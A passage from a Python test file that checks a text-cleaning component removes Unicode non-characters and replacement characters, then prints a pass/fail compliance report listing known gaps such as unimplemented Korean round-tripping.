                    self.stats["passed"] += 1

            except Exception:
                self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_non_characters(self):
        """Test Unicode non-characters."""
        print("Testing non-characters...")

        non_chars = [
            "\ufffe",  # Non-character
            "\uffff",  # Non-character
            "\ufdd0",  # Non-character
            "\ufdef",  # Non-character
        ]

        region = self.manager.get_region("A1")

        for char in non_chars:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": char, "GlobalID": "test"}
                region.clean(entry)

                result = entry.get("CanonicalLatin", "")
                if char in result:
                    self.failures.append(f"Non-character {ord(char):04x} not removed")
                    self.stats["failed"] += 1
                else:
                    self.stats["passed"] += 1

            except RegionRuleError:
                self.stats["passed"] += 1
            except Exception as e:
                self.warnings.append(f"Non-char {ord(char):04x}: {str(e)[:30]}")
                self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_replacement_characters(self):
        """Test replacement character handling."""
        print("Testing replacement characters...")

        region = self.manager.get_region("A1")

        self.stats["total"] += 1

        entry = {"CanonicalLatin": "\ufffd", "GlobalID": "test"}
        try:
            region.clean(entry)

            result = entry.get("CanonicalLatin", "")
            if "\ufffd" in result:
                self.failures.append("Replacement character not handled")
                self.stats["failed"] += 1
            else:
                self.stats["passed"] += 1

        except RegionRuleError:
            self.stats["passed"] += 1

    def print_final_report(self):
        """Print comprehensive final report."""
        print("\n" + "=" * 80)
        print("PSYCHOTIC PARANOID TEST RESULTS")
        print("=" * 80)

        print("\n📊 Statistics:")
        print(f"  Total tests: {self.stats['total']}")
        print(
            f"  Passed: {self.stats['passed']} ({self.stats['passed']/max(1,self.stats['total'])*100:.1f}%)"
        )
        print(
            f"  Failed: {self.stats['failed']} ({self.stats['failed']/max(1,self.stats['total'])*100:.1f}%)"
        )
        print(
            f"  Warnings: {self.stats['warnings']} ({self.stats['warnings']/max(1,self.stats['total'])*100:.1f}%)"
        )

        if self.failures:
            print(f"\nFAIL Critical Failures ({len(self.failures)}):")
            for failure in self.failures[:10]:
                print(f"  - {failure}")
            if len(self.failures) > 10:
                print(f"  ... and {len(self.failures)-10} more")

        if self.warnings:
            print(f"\nWARN  Warnings ({len(self.warnings)}):")
            for warning in self.warnings[:10]:
                print(f"  - {warning}")
            if len(self.warnings) > 10:
                print(f"  ... and {len(self.warnings)-10} more")

        print("\n" + "=" * 80)

        # Final verdict
        if self.stats["failed"] == 0:
            print("PASS PERFECT - No critical failures!")
        elif self.stats["failed"] < self.stats["total"] * 0.01:
            print("PASS EXCELLENT - Less than 1% failure rate")
        elif self.stats["failed"] < self.stats["total"] * 0.05:
            print("WARN GOOD - Less than 5% failure rate")
        else:
            print("FAIL NEEDS WORK - Significant failures detected")

        # Compliance calculation
        compliance = (self.stats["passed"] / max(1, self.stats["total"])) * 100
        print(f"\n🎯 OVERALL COMPLIANCE: {compliance:.1f}%")

        if compliance < 100:
            print("\n📝 Why not 100%?")
            print("  1. Korean FST round-trip not implemented")
            print("  2. Collision suffix '--1' blocked as CSV injection")
            print("  3. Some Unicode edge cases not fully normalized")
            print("  4. Resource fallbacks not implemented")
            print("  5. Historical variants not supported")


if __name__ == "__main__":
    tester = PsychoticParanoidTester()
    tester.run_all_tests()
